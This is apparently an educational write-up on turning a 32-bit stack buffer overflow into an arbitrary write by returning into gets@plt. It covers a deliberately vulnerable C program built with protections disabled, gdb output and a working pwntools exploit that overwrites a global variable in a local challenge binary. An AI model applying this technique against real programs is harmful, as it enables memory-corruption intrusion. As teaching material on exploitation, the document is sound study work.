# Exploits
## Stack buffer overflow : Arbiratry write with input
Let's say you have a stack buffer overflow but your overflow can't reach a certain location because it's not in the memory segment from where you're overflowing, supposing that the target adderss if of course writable, there's a way, it's really simple and not so hard to do  
Why not using the function that you're using to overflow to write to this address what data you want passed by input since you call this function again ?  
It could be `gets`, `scanf`, `strcpy` or even `fgets`, well this results to an arbiratry write to a specific location  
Let's see the source code of this program :
```c
#include <stdio.h>
#include <stdlib.h>

#define WIN_TARGET 0xb47ec0de

int target = 0; // variables in .bss/.data aren't randomized

void check()
{
	printf("target : %x\n", target);
	if(target == WIN_TARGET)
	{
		printf("G00d job !\n");
	}
	else
	{
		printf("n0pe...\n");
	}
}

void vuln()
{
	char buffer[64];
	gets(buffer);
}
int main()
{
	vuln();
}
```
The goal is of course to overwrite the `target` variable with `0xb47ec0de` which are 4 bytes in hexadecimal that can be placed in this number  
Then to proceed the check and validate the challenge we have to call the `check` function, it's really simple, that's what we have to do :
1. Overflow the buffer and overwrite the instruction pointer backup with the address of `gets@plt` to call it
2. As input of for `gets`, we have to pass `0xb47ec0de` (packed)
3. Then we can call `check` to get the validation message
Let's first compile the source code :
```
gcc <source code filename>.c -o <exectable> -fno-stack-protector -m32 -no-pie
```
By the way, for this example it won't have any effect if you enable or disable ASLR because with PIE disabled, given that `target` is at `.data` address that won't change at execution, it's address won't be random, that's not required, it could be a variable in the heap and in this case ASLR must be disabled otherwise we won't know it's address but it's good to know  
For the epxloit, we first need some addresses :
First we need `gets` in the `Procedure Linkage Table` address, we will use GDB for that :
```
gdb <execuable>
# (gdb)>
disass vuln
```
It gived me :
```nasm
Dump of assembler code for function vuln:
   0x080491e6 <+0>:	push   ebp
   0x080491e7 <+1>:	mov    ebp,esp
   0x080491e9 <+3>:	push   ebx
   0x080491ea <+4>:	sub    esp,0x44
   0x080491ed <+7>:	call   0x804922a <__x86.get_pc_thunk.ax>
   0x080491f2 <+12>:	add    eax,0x2e0e
   0x080491f7 <+17>:	sub    esp,0xc
   0x080491fa <+20>:	lea    edx,[ebp-0x48]
   0x080491fd <+23>:	push   edx
   0x080491fe <+24>:	mov    ebx,eax
   0x08049200 <+26>:	call   0x8049040 <gets@plt>
   0x08049205 <+31>:	add    esp,0x10
   0x08049208 <+34>:	nop
   0x08049209 <+35>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x0804920c <+38>:	leave  
   0x0804920d <+39>:	ret    
End of assembler dump.
```
So `gets@plt` is at `0x8049040` for me  
Then we need the `check` function address, which will be called after the arbitrary write, still using gdb :
```
x check
```
It gived me :
```
0x8049182 <check>:	0x53e58955
```
So `check` is at `0x8049182`  
Now finally, we need the `target` global variable address, we will use `nm` for that :
```
nm <executable> | grep target
```
Which gived me :
```
0804c028 B target
```
So `taget` is at `0804c028`  
Awesome !  
Now let's make the exploit (the code is commented) :
```python
from pwn import *
import struct
import time
elf = context.binary = ELF('<executable>', checksec=False)
p = process()

payload = b"A"*76 # offset before overwriting EIP backup
payload += struct.pack("I", 0x8049040) # gets@plt
payload += struct.pack("I", 0x8049182) # check function
payload += struct.pack("I", 0x0804c028) # args[0] of gets => target address
file = open("payload", "wb") # just in case it didn't work so we can debug with gdb
file.write(payload)

p.sendline(payload) # payload : gets(target); check();
time.sleep(1) # timeout because of gets() input
# now gets is called and we can pass input for it that it will write at the target address
p.sendline(struct.pack("I", 0xb47ec0de)) # to get the win message
r = p.recvall(); # we recieve the message it will print
print(str(r.decode("utf-8"))) # we show it
```
I ran it :
```
python3 exploit.py
```
And...
```
[+] Starting local process '...': pid 8369
[+] Receiving all data: Done (29B)
[*] Stopped process '...' (pid 8369)
target : b47ec0de
G00d job !

```
Nice !  
Thanks for reading !
